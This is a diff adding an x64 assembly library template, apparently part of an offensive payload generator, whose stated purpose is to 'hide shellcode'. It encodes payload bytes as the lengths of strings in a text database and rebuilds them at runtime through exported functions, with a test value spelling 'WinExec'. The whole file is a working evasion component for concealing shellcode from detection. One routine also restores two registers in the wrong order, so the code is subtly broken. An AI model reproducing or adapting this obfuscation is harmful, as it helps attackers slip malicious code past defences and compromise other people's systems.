@@ -1,0 +1,132 @@
+#!name##Archon_Lib
+#!types##support
+#!subTypes##lib
+#!info##hide shellcode
+#!options##LIB_COMPILER##mingw-x64
+#!options##DLL_NO_DLL##True
+#!lang##asm
+#!system_FLAG##[W]
+#!reqFood##ARCH_text##TEXT_data2##text database
+#!reqVar##atest##scode##str
+#!setVar##atest##0x48, 0x28, 0x57, 0x69, 0x6e, 0x45, 0x78, 0x65, 0x63, 0x00, 0x50##str
+
+
+
+
+bits 64
+default rel
+
+global ArchonGet
+global ArchonReset
+global ArchonGetByte
+global ArchonLen
+
+
+section .data
+{{ TOOL.asm_build_scode(atest, ARCH_text, "arch")}}
+
+section .bss
+    arch_index: resd 1  ; shellcode index
+    
+
+section .text
+
+ArchonLen:
+; Return shellcode length
+; OUT: rax - shellcode length
+    push rbp
+    mov rbp, rsp
+    xor rax, rax
+    mov rax, arch_len
+    pop rbp
+    ret
+
+ArchonGet:
+; Get part of shellcode
+; IN: rcx - buffer for shellcode bytes
+; IN: rdx - number of bytes
+; OUT: rax - pointer to buffer
+    push rbp
+    mov rbp, rsp
+    sub rsp, 16
+    mov [rbp-8], rcx    ; buffer
+    mov [rbp-16], rdx   ; bytes number
+    push r14
+    push r15
+    push rdi
+    push rsi
+    
+    ; clear buffer
+    mov rdi, rcx
+    mov rcx, rdx
+    xor rax, rax
+    cld
+    rep stosb
+    
+    xor r14, r14    ; counter
+    xor rsi, rsi
+    mov rdi, [rbp-8]
+    sub rsp, 40
+    .get_bytes:
+        cmp r14, [rbp-16]
+        je .end_loop
+        call ArchonGetByte
+        mov byte [rdi+r14], al
+        inc r14
+        jmp .get_bytes
+    
+    .end_loop:
+        add rsp, 40
+        mov rax, [rbp-8]    ; return pointer
+        
+    .return:
+        pop rdi
+        pop rsi
+        pop r15
+        pop r14
+        add rsp, 16
+        pop rbp
+        ret
+
+ArchonReset:
+; Reset shellcode index
+    push rbp
+    mov rbp, rsp
+    
+    lea rcx, [arch_index]
+    mov dword [rcx], 0
+    
+    pop rbp
+    ret
+
+
+ArchonGetByte:
+; Get shellcode byte
+; OUT: rax (al) - shellcode byte or 0
+    push rbp
+    mov rbp, rsp
+    
+    lea rcx, [arch_index]
+    mov ecx, [rcx]  ; get actual index
+    lea rdx, [arch_all]
+    mov rdx, [rdx + 8 * rcx]    ; get text
+    xor r8, r8  ; counter
+    xor r9, r9
+    .match_len:
+        mov byte r9b, [rdx+r8]
+        cmp r9b, 0
+        je .put_byte
+        inc r8  ; counter + 1
+        jmp .match_len
+    
+    .put_byte:
+        xor rax, rax
+        mov byte al, r8b    ; return shellcode byte
+        lea rcx, [arch_index]
+        mov edx, [rcx]
+        inc edx
+        mov dword [rcx], edx    ; save new index
+
+    .return:
+        pop rbp
+        ret
